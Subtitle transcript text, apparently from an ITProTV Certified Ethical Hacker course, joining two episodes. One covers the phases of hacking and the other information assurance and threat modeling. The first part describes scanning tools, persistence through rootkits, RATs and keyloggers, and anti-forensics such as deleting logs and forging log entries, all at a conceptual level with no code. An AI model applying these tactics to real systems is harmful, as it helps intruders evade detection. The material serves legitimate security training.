00:26:47.268\nall right, why reinvent the word\ndocument when we already have one there?\n\n546\n00:26:47.268 --> 00:26:50.402\nAll right, so when we're thinking\nabout scanning the second phase down,\n\n547\n00:26:50.402 --> 00:26:51.954\nremember overall phase number two.\n\n548\n00:26:51.954 --> 00:26:56.157\nActive and passive are subtypes of recons,\nso they're just types of the recon phase.\n\n549\n00:26:56.157 --> 00:26:59.597\nWhen we think about scanning,\nwe're thinking about going out again,\n\n550\n00:26:59.597 --> 00:27:01.612\npre-attack, we have not attacked yet.\n\n551\n00:27:01.612 --> 00:27:03.793\nAll this activity, recon and scanning,\n\n552\n00:27:03.793 --> 00:27:08.170\nis all about the pre-attacks stuff that\ngoes on to set us up to be successful.\n\n553\n00:27:08.170 --> 00:27:09.132\nWe're gonna go out and\n\n554\n00:27:09.132 --> 00:27:12.277\nwe're gonna take a look at information\nthat we've gotten during recon.\n\n555\n00:27:12.277 --> 00:27:16.177\nAnd we're gonna try to then probe the\nedges of the network to figure out what we\n\n556\n00:27:16.177 --> 00:27:17.022\ncan do to get in.\n\n557\n00:27:17.022 --> 00:27:19.430\nWhere are the vulnerabilities,\nwhere are the weaknesses?\n\n558\n00:27:19.430 --> 00:27:23.069\nWe may use ports scanning software,\nfor instance,\n\n559\n00:27:23.069 --> 00:27:27.548\nsomething like SuperScan,\nwhich is just a port scanning tool.\n\n560\n00:27:27.548 --> 00:27:31.680\nWe may go in and\nuse something like WhatsUpGold, right?\n\n561\n00:27:31.680 --> 00:27:35.601\nA tool like that,\nwe may use a tool like Angry IP Scanner,\n\n562\n00:27:35.601 --> 00:27:40.095\nthese are just all tools that we can\nuse and we can actually go in and\n\n563\n00:27:40.095 --> 00:27:43.880\nwe can play with to find\ninformation about the system.\n\n564\n00:27:43.880 --> 00:27:47.195\nAnd see what services are running,\nwhat ports are open,\n\n565\n00:27:47.195 --> 00:27:49.338\nwhat IP addresses may be available,\n\n566\n00:27:49.338 --> 00:27:54.130\nwhat points of entry will be available to\nus that we can leverage and we can use?\n\n567\n00:27:54.130 --> 00:27:57.615\nThat's what scanning is, again, this\nis pre-attack, we're warming up, right?\n\n568\n00:27:57.615 --> 00:28:01.149\nWe're touching things, but\nwe're not in active attack mode yet,\n\n569\n00:28:01.149 --> 00:28:03.700\nthen we're gonna go to gaining access,\nright?\n\n570\n00:28:03.700 --> 00:28:07.840\nOur next phase, phase three, gaining\naccess is where we will talk about going\n\n571\n00:28:07.840 --> 00:28:10.988\nactive, this is where we\nactually seek to attack, right?\n\n572\n00:28:10.988 --> 00:28:15.250\nSo the idea is we're gonna take all the\ninformation, all of the knowledge we've\n\n573\n00:28:15.250 --> 00:28:19.400\ngathered in recon and scan where\nwe've stealthily probing and looking.\n\n574\n00:28:19.400 --> 00:28:23.297\nAnd we're now gonna take that and we're\ngonna leverage that to gain access to and\n\n575\n00:28:23.297 --> 00:28:26.529\nexploit one or more systems and\nown them, take them over, right?\n\n576\n00:28:26.529 --> 00:28:30.430\nAnd try to take control, we may go in and\nexploit vulnerabilities or\n\n577\n00:28:30.430 --> 00:28:34.990\nweaknesses at various levels,\nthe operating system, the application.\n\n578\n00:28:34.990 --> 00:28:38.676\nWe may put root kits in and try to\nsubvert the system at the kernel level,\n\n579\n00:28:38.676 --> 00:28:41.202\nthere's all sorts of stuff we could do,\nright?\n\n580\n00:28:41.202 --> 00:28:44.201\nWe may try to put malware and\nremote access tools and\n\n581\n00:28:44.201 --> 00:28:48.510\nsome sort of RAT, remote access\ntoolkit may be placed on the system.\n\n582\n00:28:48.510 --> 00:28:52.479\nWe may keep an open channel or\nwe may just simply touch the system once,\n\n583\n00:28:52.479 --> 00:28:55.661\nwalk away, so gaining access and\nmaintaining access.\n\n584\n00:28:55.661 --> 00:28:58.387\nThe next phase can be part of\nthe same activity chain or\n\n585\n00:28:58.387 --> 00:29:00.250\ncan be distinctly different.\n\n586\n00:29:00.250 --> 00:29:04.390\nWhen they choose to get in once and that's\nit, or may wanna get in and stay there and\n\n587\n00:29:04.390 --> 00:29:05.839\nmaintain access long term.\n\n588\n00:29:05.839 --> 00:29:10.550\nMaintaining access is all about keeping\ncontrol, keeping open that pipe that we'd\n\n589\n00:29:10.550 --> 00:29:14.170\nbroken open into the system\nby finding a vulnerability.\n\n590\n00:29:14.170 --> 00:29:16.940\nSo it's one thing to get in,\nit's another thing to stay there,\n\n591\n00:29:16.940 --> 00:29:18.338\nwe may put keyloggers in place.\n\n592\n00:29:18.338 --> 00:29:22.806\nWe may put in remote access\ntrojans like I mentioned,\n\n593\n00:29:22.806 --> 00:29:28.580\nRATS and/or some sort of root kit or\nzombie-type system software.\n\n594\n00:29:28.580 --> 00:29:32.414\nThat can be put there to maintain\ncontrol over that box on demand and\n\n595\n00:29:32.414 --> 00:29:35.427\nthen wake it up and\ngrab it when we need it, and then,\n\n596\n00:29:35.427 --> 00:29:38.386\nobviously, over time be\nable to profit from that.\n\n597\n00:29:38.386 --> 00:29:43.498\nAnd then finally, clearing tracks is all\nabout removing evidence of what we did,\n\n598\n00:29:43.498 --> 00:29:47.260\nwe may go in and\nwe may decide to delete log files, right?\n\n599\n00:29:47.260 --> 00:29:50.963\nWe may go in and hide the malicious\nactivities we've been involved with,\n\n600\n00:29:50.963 --> 00:29:53.544\nwe may wanna cover up\ncontinuing access over time.\n\n601\n00:29:53.544 --> 00:29:57.756\nWe may wanna be able to get rid of\nsuspicious information that was left\n\n602\n00:29:57.756 --> 00:30:02.790\nthere, install files, things like that,\nthere's all sorts of stuff, right?\n\n603\n00:30:02.790 --> 00:30:05.848\nWe're always gonna try, if we're smart,\nto hide our identity and\n\n604\n00:30:05.848 --> 00:30:08.640\ntry to prevent the people that\nare gonna come and forensically\n\n605\n00:30:08.640 --> 00:30:12.202\nexamine the system when we're done with\nit, from finding what we're doing.\n\n606\n00:30:12.202 --> 00:30:15.296\nSo we wanna cover up those tracks,\nif possible,\n\n607\n00:30:15.296 --> 00:30:19.640\nwe may have software we use to\nremove evidence of our activities.\n\n608\n00:30:19.640 --> 00:30:22.506\nWe may decide to uninstall\ncertain software,\n\n609\n00:30:22.506 --> 00:30:25.084\nwe may decide to create fake log entries.\n\n610\n00:30:25.084 --> 00:30:28.835\nWe may decide to blow up the system,\nobliterating in theory,\n\n611\n00:30:28.835 --> 00:30:31.030\nall evidence of what we did.\n\n612\n00:30:31.030 --> 00:30:34.685\nIf it's a router, we may decide to\nmodify the running config of the system,\n\n613\n00:30:34.685 --> 00:30:37.380\nleaving behind no evidence\nwhen we restart the router.\n\n614\n00:30:37.380 --> 00:30:40.675\nExcept the fact that it was restarted\nwiping out the running config because\n\n615\n00:30:40.675 --> 00:30:43.237\nit'll be loaded from the stored config,\nand therefore,\n\n616\n00:30:43.237 --> 00:30:45.100\nthe modifications will disappear.\n\n617\n00:30:45.100 --> 00:30:48.007\nThere's lots of ways we can hack in,\ndo a bunch of stuff, and\n\n618\n00:30:48.007 --> 00:30:49.946\nthen cover our tracks when we're done.\n\n619\n00:30:49.946 --> 00:30:53.383\nThe best people that do this and that can\nget away with anything are people you\n\n620\n00:30:53.383 --> 00:30:56.480\nnever see, they're ghosts,\nyou never know they were there.\n\n621\n00:30:56.480 --> 00:30:59.742\nBecause they're so good at what they do,\nand so good at covering their tracks,\n\n622\n00:30:59.742 --> 00:31:02.630\nthat you have no idea that they've\never been there in the first place.\n\n623\n00:31:02.630 --> 00:31:06.303\nHacking, whether you're doing it\nas a certified ethical hacker or\n\n624\n00:31:06.303 --> 00:31:09.790\non the dark side, at the end of the day,\nthe skills are the same.\n\n625\n00:31:09.790 --> 00:31:13.210\nYou've gotta understand how to get in and\nget out without getting caught, right?\n\n626\n00:31:13.210 --> 00:31:17.001\nThat's the idea, and by the way, take\nadvantage of vulnerabilities along the way\n\n627\n00:31:17.001 --> 00:31:20.460\nto make your job easier in the sense\nyou could exploit weaknesses.\n\n628\n00:31:20.460 --> 00:31:23.641\nThe best hackers in the world are people\nthat don't talk about what they do,\n\n629\n00:31:23.641 --> 00:31:26.240\nwhich in and of itself is not\nrealistic for most human beings.\n\n630\n00:31:26.240 --> 00:31:28.490\nThey don't brag, in other words, right?\n\n631\n00:31:28.490 --> 00:31:31.440\nThey don't tell people what they did,\nthey just do it, put their head down and\n\n632\n00:31:31.440 --> 00:31:32.926\nthen they go on to the next job, right?\n\n633\n00:31:32.926 --> 00:31:35.257\nSo the people that talk\nabout how good they,\n\n634\n00:31:35.257 --> 00:31:38.610\nare are typically not the people\nthat are good at doing this.\n\n635\n00:31:38.610 --> 00:31:42.030\nI mean they may be good, don't get me\nwrong, people can be braggadocio and\n\n636\n00:31:42.030 --> 00:31:45.310\nbe very, very good at what they do and\njust wanna brag about it, right?\n\n637\n00:31:45.310 --> 00:31:49.428\nAnd that's okay, in theory, if you don't\nmind sitting and listening to them, but\n\n638\n00:31:49.428 --> 00:31:52.618\nthe reality is you don't have to\nbrag about being good to be good,\n\n639\n00:31:52.618 --> 00:31:54.460\nyou just have to be good.\n\n640\n00:31:54.460 --> 00:31:58.119\nAnd the people that are really good are\nthe people that keep their mouths shut and\n\n641\n00:31:58.119 --> 00:32:01.350\njust go on about their business and\nyou never see them coming, right?\n\n642\n00:32:01.350 --> 00:32:04.644\nThey're just ghosts, and those\nare the people you gotta watch out for,\n\n643\n00:32:04.644 --> 00:32:07.950\ncuz those are the people that can kill\nyou without you even realizing it.\n\n644\n00:32:07.950 --> 00:32:10.555\nAnd those are the ones that CEHs,\nCertified Ethical Hackers,\n\n645\n00:32:10.555 --> 00:32:12.334\nhave the hardest time defending against.\n\n646\n00:32:12.334 --> 00:32:15.605\nBecause those are the cyber attackers\nthat are able to get in and\n\n647\n00:32:15.605 --> 00:32:17.610\nout of systems almost at will.\n\n648\n00:32:17.610 --> 00:32:21.216\nAnd are incredibly difficult to find\nbecause they don't tend to leave behind\n\n649\n00:32:21.216 --> 00:32:24.722\na lot of telltale evidence as to what\nthey're doing, more often than not.\n\n650\n00:32:24.722 --> 00:32:29.230\n>> All right, Adam, very good look at\nthe different concepts of hacking.\n\n651\n00:32:29.230 --> 00:32:33.388\nWe took a look at the different phases of\nthe hacking life cycle, if you will, and\n\n652\n00:32:33.388 --> 00:32:37.855\nthen the different classes of hackers,\nblack hats, white hats, script kitties, so\n\n653\n00:32:37.855 --> 00:32:38.730\non and so forth.\n\n654\n00:32:38.730 --> 00:32:43.053\nSo we thank you for that, some great,\nagain, foundational knowledge that we're\n\n655\n00:32:43.053 --> 00:32:45.848\nbuilding up as we move through\nthis series of videos.\n\n656\n00:32:45.848 --> 00:32:49.492\nHope everybody out there enjoyed watching,\nsigning off for ITProTV, I'm Mike Rodrick.\n\n657\n00:32:49.492 --> 00:32:50.648\n>> I'm a ghost.\n\n658\n00:32:50.648 --> 00:32:52.016\n>> And we'll see you next time.\n\n659\n00:32:52.016 --> 00:32:52.852\n>> Take care.\n\n660\n00:32:52.852 --> 00:33:00.780\n[MUSIC]\n\n",

at ITPRO TV.\n\n4\n00:00:15.720 --> 00:00:18.820\nI'm your host, Mike Rodrick, and\ntoday we're doing our CEH version nine.\n\n5\n00:00:18.820 --> 00:00:21.870\nAnd specifically in this episode,\nwe're gonna be taking a look at\n\n6\n00:00:21.870 --> 00:00:26.660\ninformation security controls,\nas well as some security laws and\n\n7\n00:00:26.660 --> 00:00:29.990\nstandards that we need to be\nfamiliar with, for our CEH.\n\n8\n00:00:29.990 --> 00:00:32.600\nAnd here to help us with that of course,\nis Mr. Adam Gordon.\n\n9\n00:00:32.600 --> 00:00:33.360\nHow you doing, Adam?\n\n10\n00:00:33.360 --> 00:00:34.040\n>> Good, good.\n\n11\n00:00:34.040 --> 00:00:35.430\nI'm feeling very legal.\n\n12\n00:00:35.430 --> 00:00:36.920\nAnd very constrained, but\n\n13\n00:00:36.920 --> 00:00:40.970\nalso suspiciously somehow\nembolded in a line today.\n\n14\n00:00:40.970 --> 00:00:44.510\nWe'll see how all that goes, but\nlet's see if we can be regulatory and\n\n15\n00:00:44.510 --> 00:00:45.760\ncompliant in the same sentence.\n\n16\n00:00:45.760 --> 00:00:47.100\nWe'll see how that comes out as well.\n\n17\n00:00:47.100 --> 00:00:50.310\nSo we're gonna talk a bit about\ninformation security controls,\n\n18\n00:00:50.310 --> 00:00:53.360\ntalk about some of the standards and\nregulatory compliance concerns.\n\n19\n00:00:53.360 --> 00:00:57.170\nWe would have, as a Certified Ethical\nHacker, what is information assurance,\n\n20\n00:00:57.170 --> 00:00:59.990\nwhy is it important, why should we care?\n\n21\n00:00:59.990 --> 00:01:02.525\nThe answer is forthcoming soon\nin the following episode.\n\n22\n00:01:02.525 --> 00:01:04.670\n>> [LAUGH]\n>> All right, so, information assurance.\n\n23\n00:01:04.670 --> 00:01:10.560\nLet's talk a bit about the idea behind IA,\nwhat it means for us as ethical hackers,\n\n24\n00:01:10.560 --> 00:01:14.350\nor indeed just as security professionals\nto think about information assurance.\n\n25\n00:01:14.350 --> 00:01:16.370\nWhen we think about governance risk and\ncompliance,\n\n26\n00:01:16.370 --> 00:01:19.470\nwe think about GRC activities\nin the organization.\n\n27\n00:01:19.470 --> 00:01:22.460\nWe have to think about the point\npeople that help us manage risk,\n\n28\n00:01:22.460 --> 00:01:26.130\nassess our level of compliance,\nand the value and\n\n29\n00:01:26.130 --> 00:01:29.950\nindeed the adherence to the governance\nregimes we have put in place and\n\n30\n00:01:29.950 --> 00:01:33.100\nwhether we are aligned or not,\nand whether we are compliant or\n\n31\n00:01:33.100 --> 00:01:35.830\nnot, and whether we have\nthe proper oversight or not.\n\n32\n00:01:35.830 --> 00:01:38.990\nAre very important concerns,\nand information assurance or\n\n33\n00:01:38.990 --> 00:01:44.320\nsomething like that role, we may see a\nCRO, a Chief Risk Officer, emerging today.\n\n34\n00:01:44.320 --> 00:01:49.200\nWe see in some cases the government\nof the military area,\n\n35\n00:01:49.200 --> 00:01:54.100\nmore formal reference to a specific IA,\ninformation assurance role\n\n36\n00:01:54.100 --> 00:01:57.670\nseparate from risk management,\nseparate from other things.\n\n37\n00:01:57.670 --> 00:02:01.270\nWe may see generically\na Chief Compliance Officer,\n\n38\n00:02:01.270 --> 00:02:04.390\nCCO in the organization,\non the private sector.\n\n39\n00:02:04.390 --> 00:02:05.920\nThere's different ways\nto think about this,\n\n40\n00:02:05.920 --> 00:02:10.540\nbut ultimately these roles are responsible\nfor integrity, are responsible for\n\n41\n00:02:10.540 --> 00:02:14.760\nconfidentiality, are responsible for\navailability of information,\n\n42\n00:02:14.760 --> 00:02:19.450\nthe specification of the controls, the\noversight, the monitoring, the management,\n\n43\n00:02:19.450 --> 00:02:24.370\nand the validation of those inside\nof the organization with regards to\n\n44\n00:02:24.370 --> 00:02:27.950\nthat level of, not only adherence\nin the information management, but\n\n45\n00:02:27.950 --> 00:02:29.760\nalso the use of information day to day.\n\n46\n00:02:29.760 --> 00:02:34.680\nThe IA roll was about making sure that we\nhave a set of standards, typically aligned\n\n47\n00:02:34.680 --> 00:02:40.050\nwith policy driven through,\nmonitored by and implemented as a result\n\n48\n00:02:40.050 --> 00:02:44.580\nof policy being translated through the\norganization if the process and procedure.\n\n49\n00:02:44.580 --> 00:02:48.610\nAnd then being able to continuously\nmonitor that, and assess the value\n\n50\n00:02:48.610 --> 00:02:53.200\nof that information flow or that\nmanagement oversight in the organization.\n\n51\n00:02:53.200 --> 00:02:57.035\nSo information assurance is all about\nmaking sure that we do the right thing,\n\n52\n00:02:57.035 --> 00:02:59.320\nat the right time, for the right reasons.\n\n53\n00:02:59.320 --> 00:03:02.400\nAnd that way, we have validation,\nwe have proof of that most importantly.\n\n54\n00:03:02.400 --> 00:03:06.210\nSo it's very, very critical for us to\nhave policy, have process procedure and\n\n55\n00:03:06.210 --> 00:03:08.770\nguidance developed and\nbroadly communicated\n\n56\n00:03:08.770 --> 00:03:12.640\namong all the members of the organization\nthat are gonna touch those systems.\n\n57\n00:03:12.640 --> 00:03:17.665\nOne of the places where we often fall down\non the job as a CEH or and as more broadly\n\n58\n00:03:17.665 --> 00:03:22.120\na just generically a security professional\nis not about creating the policies.\n\n59\n00:03:22.120 --> 00:03:23.690\nPolicies usually are there.\n\n60\n00:03:23.690 --> 00:03:26.300\nThey come from senior management\nmore often than not and\n\n61\n00:03:26.300 --> 00:03:30.900\nare gonna be a statement of intent at\na high level, a more strategic focus level\n\n62\n00:03:30.900 --> 00:03:35.150\nof the organization where we tend to\nbreakdown is where we try to translate\n\n63\n00:03:35.150 --> 00:03:40.120\nthat policy into something that is\ntangible, that is understood by\n\n64\n00:03:40.120 --> 00:03:45.500\nthe masses, that is consumed by them, and\nthat is standardized for the organization.\n\n65\n00:03:45.500 --> 00:03:48.940\nThe application of policy through\nprocess and procedure, in other words,\n\n66\n00:03:48.940 --> 00:03:50.650\nis where we often breakdown.\n\n67\n00:03:50.650 --> 00:03:55.670\nAnd the broad communication around that\nto create awareness of the responsibility\n\n68\n00:03:55.670 --> 00:03:58.350\nthrough due care and due diligence,\nterms that are very important for\n\n69\n00:03:58.350 --> 00:04:02.100\nyou to be aware of, and vocabulary terms\nthat you should practice using and\n\n70\n00:04:02.100 --> 00:04:06.400\nput into practice in the organization,\nwith regards to risk management.\n\n71\n00:04:06.400 --> 00:04:09.010\nIf you're not able,\nas a security professional today,\n\n72\n00:04:09.010 --> 00:04:13.040\nto understand how to define due care and\ndue diligence, you're not doing your job.\n\n73\n00:04:13.040 --> 00:04:16.690\nAnd if you're not able to define those\nterms with regards to the things you do\n\n74\n00:04:16.690 --> 00:04:20.910\nevery day and understand\ntangible examples of do care and\n\n75\n00:04:20.910 --> 00:04:23.400\ndo diligence in your world,\nyou're not doing your job.\n\n76\n00:04:23.400 --> 00:04:26.360\nI don't care what you do,\nI don't care how well you do it,\n\n77\n00:04:26.360 --> 00:04:29.470\nyou are not doing the things you\nneed to do to be risk aware and\n\n78\n00:04:29.470 --> 00:04:33.540\nto be able to manage risk down,\nmitigate it in the organization.\n\n79\n00:04:33.540 --> 00:04:37.050\nVery important concepts that you have\nto learn how to communicate broadly and\n\n80\n00:04:37.050 --> 00:04:40.970\nwidely throughout the organization\nwith regards to security awareness.\n\n81\n00:04:40.970 --> 00:04:44.840\nThe most important thing we can do\nwith regards to IA is to broadly and\n\n82\n00:04:44.840 --> 00:04:46.160\nwidely create awareness and\n\n83\n00:04:46.160 --> 00:04:51.910\na culture of security that must be created\nto transmit this in the organization.\n\n84\n00:04:51.910 --> 00:04:53.500\nMike help me play a game\nif you don't mind.\n\n85\n00:04:53.500 --> 00:04:54.360\n>> Sure.\n\n86\n00:04:54.360 --> 00:04:55.731\n>> You were looking a little\nbored there for a minute.\n\n87\n00:04:55.731 --> 00:04:57.370\n>> [LAUGH]\n>> I thought I’d bring it back in.\n\n88\n00:04:57.370 --> 00:05:00.120\nMike was getting ready to go\nupdate his Facebook status.\n\n89\n00:05:00.120 --> 00:05:01.950\nI’m bored.\nThat was what he was going to say\n\n90\n00:05:01.950 --> 00:05:02.810\nwhile Adam was talking.\n\n91\n00:05:02.810 --> 00:05:05.410\nSo, let’s play a game for\njust a second, shall we?\n\n92\n00:05:05.410 --> 00:05:09.325\nSo how in an organization, you've\nworked in the private sector outside\n\n93\n00:05:09.325 --> 00:05:12.395\nof this particular company that we\nare both doing some work for this week.\n\n94\n00:05:12.395 --> 00:05:15.485\nFor as you and I have chatted a million\ntimes over the time we've spent together.\n\n95\n00:05:15.485 --> 00:05:18.905\nWe both a long history in the private\nsector doing this kinda work for\n\n96\n00:05:18.905 --> 00:05:20.360\nvarious organizations.\n\n97\n00:05:20.360 --> 00:05:25.890\nWhat are some things that if you were in\ncharge of IA, if you had to create an IA\n\n98\n00:05:25.890 --> 00:05:29.100\nprogram and an awareness program in an\norganization, what are some of the steps?\n\n99\n00:05:29.100 --> 00:05:32.260\nWhat are some of the things\nyou may do to help drive that?\n\n100\n00:05:32.260 --> 00:05:34.670\n>> I would say first and\nforemost would be just training.\n\n101\n00:05:34.670 --> 00:05:36.590\nEducation for my employees.\n\n102\n00:05:36.590 --> 00:05:39.858\n>> Okay, so you wanna create some sort\nof information, security management, or\n\n103\n00:05:39.858 --> 00:05:41.090\nawareness program, right?\n\n104\n00:05:41.090 --> 00:05:44.630\nJust generally creates some sort of\nsecurity awareness training program and\n\n105\n00:05:44.630 --> 00:05:45.360\nshow people, right?\n\n106\n00:05:45.360 --> 00:05:46.660\n>> Right.\n>> Help people and\n\n107\n00:05:46.660 --> 00:05:49.785\ndo for people by example of\nwhat it is you want them to do.\n\n108\n00:05:49.785 --> 00:05:51.080\n>> Mm-hm.\n>> Okay, so we would do that.\n\n109\n00:05:51.080 --> 00:05:52.370\nDefinitely, that would be good.\n\n110\n00:05:52.370 --> 00:05:55.070\nAre there specific things\nwe may do in that program?\n\n111\n00:05:55.070 --> 00:05:57.578\nThere's probably a lot of different\nthings we could do, right?\n\n112\n00:05:57.578 --> 00:06:01.732\n>> Absolutely [INAUDIBLE] like the example\nwe talked about in another episode where\n\n113\n00:06:01.732 --> 00:06:05.280\nsomebody was requested and\nthen emailed electronic information.\n\n114\n00:06:05.280 --> 00:06:06.360\n>> W-2 and W-9's.\n\n115\n00:06:06.360 --> 00:06:07.510\nYeah, that was a biggie.\n\n116\n00:06:07.510 --> 00:06:08.230\n>> Yeah, absolutely.\n\n117\n00:06:08.230 --> 00:06:09.540\n>> That was not a good day.\n\n118\n00:06:09.540 --> 00:06:14.160\n>> And I think with the proper training\nand education and if former users were\n\n119\n00:06:14.160 --> 00:06:17.208\nmade aware they would realize that\nthat was a definitely a no no.\n\n120\n00:06:17.208 --> 00:06:18.670\n>> [LAUGH]\n>> [LAUGH]\n\n121\n00:06:18.670 --> 00:06:20.320\n>> A formal security term, by the way.\n\n122\n00:06:20.320 --> 00:06:21.530\nThat is the proper term.\n\n123\n00:06:21.530 --> 00:06:25.250\nOnly when you are certified can\nyou use no no as a formal term.\n\n124\n00:06:25.250 --> 00:06:28.580\nOtherwise, it's a boo boo or\nan ouchie, one or the other.\n\n125\n00:06:28.580 --> 00:06:30.480\nSo yes, very, very important, right?\n\n126\n00:06:30.480 --> 00:06:34.300\nWe would wanna do and focus on awareness\naround some of those tangible things.\n\n127\n00:06:34.300 --> 00:06:37.272\nWe may wanna look at a concept that\nwe can kind of roll the things\n\n128\n00:06:37.272 --> 00:06:39.630\nMike was just talked about\nup into two concepts.\n\n129\n00:06:39.630 --> 00:06:41.745\nOne, something known as thread modeling.\n\n130\n00:06:41.745 --> 00:06:42.360\n>> Mm-hm.\n>> So [INAUDIBLE] wanna\n\n131\n00:06:42.360 --> 00:06:44.660\nlook at thread modeling and\nthink through and\n\n132\n00:06:44.660 --> 00:06:48.060\nunderstand the impact of essentially\nthe what if scenario, right?\n\n133\n00:06:48.060 --> 00:06:51.822\n[INAUDIBLE] with thread modeling is,\nwhat would happen if this thread or\n\n134\n00:06:51.822 --> 00:06:54.630\nthis issue was to be faced\nby the organization.\n\n135\n00:06:54.630 --> 00:06:56.510\nHow would we respond,\nwhat would that look like,\n\n136\n00:06:56.510 --> 00:07:00.230\nwhat would we do, we'd wanna think\nabout identifying the objectives.\n\n137\n00:07:00.230 --> 00:07:01.950\nWhat are the things we\nwanna protect against.\n\n138\n00:07:01.950 --> 00:07:05.360\nWhat are the things we wanna\npotentially envision could happen.\n\n139\n00:07:05.360 --> 00:07:08.980\nThink about them, model them out,\ngo through and ask the questions.\n\n140\n00:07:08.980 --> 00:07:11.520\nLook at the scenario,\nfigure out what would happen and\n\n141\n00:07:11.520 --> 00:07:13.280\nthen come up with a plan to mitigate that.\n\n142\n00:07:13.280 --> 00:07:15.646\nSo, threat modeling is very,\nvery important,\n\n143\n00:07:15.646 --> 00:07:18.935\nwe look at it as part of our extension\nof the risk assessment approach\n\n144\n00:07:18.935 --> 00:07:22.861\nthat we have to have in the organization\nto manage risk, so linking the concept,\n\n145\n00:07:22.861 --> 00:07:26.268\nthe threat modeling to risk assessment\nvery important, and what Mike\n\n146\n00:07:26.268 --> 00:07:31.130\nwas saying regards to security awareness\nand training, very important for you.\n\n147\n00:07:31.130 --> 00:07:33.320\nAs you look to ultimately study for and\n\n148\n00:07:33.320 --> 00:07:36.200\nbe successful at pursuing\nthe CEH certification.\n\n149\n00:07:36.200 --> 00:07:37.920\nI wanna make sure we understand that.\n\n150\n00:07:37.920 --> 00:07:39.955\nSo we think about threat\nmodeling a little bit right,\n\n151\n00:07:39.955 --> 00:07:43.660\nanalyzing the potential opportunities\nthat are in front of us and\n\n152\n00:07:43.660 --> 00:07:47.420\nthink about the responses we would have,\ncrafting and tailoring.\n\n153\n00:07:47.420 --> 00:07:51.139\nThose plans, those programs,\nthose responses, to match and\n\n154\n00:07:51.139 --> 00:07:53.883\nindeed to best those\nrisks that we would find.\n\n155\n00:07:53.883 --> 00:07:56.447\nWe would also wanna link it\nto second concept, that and\n\n156\n00:07:56.447 --> 00:07:59.406\nsomething we've talked about\nalready that I've mentioned,\n\n157\n00:07:59.406 --> 00:08:02.923\nwhich is broader Which is\nthe Enterprise Security Architecture,\n\n158\n00:08:02.923 --> 00:08:06.310\nsometimes calls the Enterprise\nInformation Security Architecture.\n\n159\n00:08:06.310 --> 00:08:09.525\nEither ESA, or EISA as an acronym,\n\n160\n00:08:09.525 --> 00:08:15.040\ncuz we're always very big on the alphabet\nsoup here at ITProTV/Information security.\n\n161\n00:08:15.040 --> 00:08:18.192\nThat would be ITProTV/IS.\n\n162\n00:08:18.192 --> 00:08:18.702\n>> There we go.\n\n163\n00:08:18.702 --> 00:08:22.522\n>> I don't know if there's an acronym\nthat we can actually, ITProTV Is\n\n164\n00:08:22.522 --> 00:08:23.057\n>> There you go.\n\n165\n00:08:23.057 --> 00:08:23.881\nThere is now.\n\n166\n00:08:23.881 --> 00:08:25.210\n>> There is now, right, exactly.\n\n167\n00:08:25.210 --> 00:08:28.630\nBut with information security,\nwe're very big on acronyms.\n\n168\n00:08:28.630 --> 00:08:33.340\nI often said when I grew up, that the job\nthat I wanted would to be to sit somewhere\n\n169\n00:08:33.340 --> 00:08:37.330\nin that mythical office,\nwherever it exists, and be the person who\n\n170\n00:08:37.330 --> 00:08:41.370\nthrows the darts at the balloon-lined\nwalls, coming up with the acronyms,\n\n171\n00:08:41.370 --> 00:08:44.530\nthe three letter acronyms that\nwe use to represent everything.\n\n172\n00:08:44.530 --> 00:08:49.230\nI envision it would be called the TLA, the\nThree Letter Acronym Office, so the TLAO.\n\n173\n00:08:49.230 --> 00:08:52.160\nAnd I would be the EVP of the TLAO.\n\n174\n00:08:52.160 --> 00:08:53.660\nThat would be my job-\n>> [LAUGH]\n\n175\n00:08:53.660 --> 00:08:54.590\n>> And I would sit and\n\n176\n00:08:54.590 --> 00:08:56.420\nthrow darts at the wall all day.\n\n177\n00:08:56.420 --> 00:09:00.169\nAnd then of course come up up with\ncrazy stupid no-nonsensical names for\n\n178\n00:09:00.169 --> 00:09:02.018\nthings that really don't matter.\n\n179\n00:09:02.018 --> 00:09:04.086\nBut that would be important,\ncuz that's what you do.\n\n180\n00:09:04.086 --> 00:09:07.650\nRight, so further propagating,\nthe inanity of information security.\n\n181\n00:09:07.650 --> 00:09:08.967\n>> [LAUGH]\n>> It's what I was hoping\n\n182\n00:09:08.967 --> 00:09:09.484\nto do when I grew up.\n\n183\n00:09:09.484 --> 00:09:12.454\nDidn't quite work out that way, but\nI'm convinced somewhere in the world,\n\n184\n00:09:12.454 --> 00:09:14.440\nthere is a position that\nactually does that.\n\n185\n00:09:14.440 --> 00:09:17.360\nI just haven't been able to find the right\njob description to respond to it yet.\n\n186\n00:09:17.360 --> 00:09:18.345\n>> It's at Microsoft.\n\n187\n00:09:18.345 --> 00:09:20.167\n>> That or The-\n>> [LAUGH]\n\n188\n00:09:20.167 --> 00:09:21.299\n>> Pentagon, one or the other,\n\n189\n00:09:21.299 --> 00:09:22.350\nbecause they are masters.\n\n190\n00:09:22.350 --> 00:09:25.291\nAnd there actually is an office\nin all defense establishments,\n\n191\n00:09:25.291 --> 00:09:28.730\nthat actually does this specific thing,\nbut they actually admit that.\n\n192\n00:09:28.730 --> 00:09:30.880\nThey actually have an office\nthat does nothing but this.\n\n193\n00:09:30.880 --> 00:09:33.068\nSoftware companies like\nMicrosoft don't admit it,\n\n194\n00:09:33.068 --> 00:09:35.214\nthey just hide it in the bowels\nof the organization.\n\n195\n00:09:35.214 --> 00:09:36.955\nBut anyway, we digress, so.\n\n196\n00:09:36.955 --> 00:09:38.978\n>> [LAUGH]\n>> With regards to information or\n\n197\n00:09:38.978 --> 00:09:41.231\nEnterprise Information\nSecurity Architecture,\n\n198\n00:09:41.231 --> 00:09:43.792\nthe other point that Mike made,\nthat we want to draw out and\n\n199\n00:09:43.792 --> 00:09:46.876\nbring up is that we can roll this up\nas part of the security awareness and\n\n200\n00:09:46.876 --> 00:09:50.272\ntraining, into this concept of\ncreating the ESA or the EISA.\n\n201\n00:09:50.272 --> 00:09:55.262\nAnd formally institutionalizing\nthe knowledge necessary to create\n\n202\n00:09:55.262 --> 00:09:58.022\nthe strategic statements of intent,\nthe policy.\n\n203\n00:09:58.022 --> 00:10:00.602\nAnd then guide them and\nimplement them through process and\n\n204\n00:10:00.602 --> 00:10:05.196\npolicy with a directive and\nan over-arching sense of idea and\n\n205\n00:10:05.196 --> 00:10:09.506\nexecution which is the ESA, the Enterprise\nSecurity Architecture, or the EISA,\n\n206\n00:10:09.506 --> 00:10:12.176\nthe Enterprise Information\nSecurity Architecture.\n\n207\n00:10:12.176 --> 00:10:16.430\nIt determines the structure and behavior\nof the organization's information systems,\n\n208\n00:10:16.430 --> 00:10:20.290\nwith regards to processing, security,\nand all the things associated with 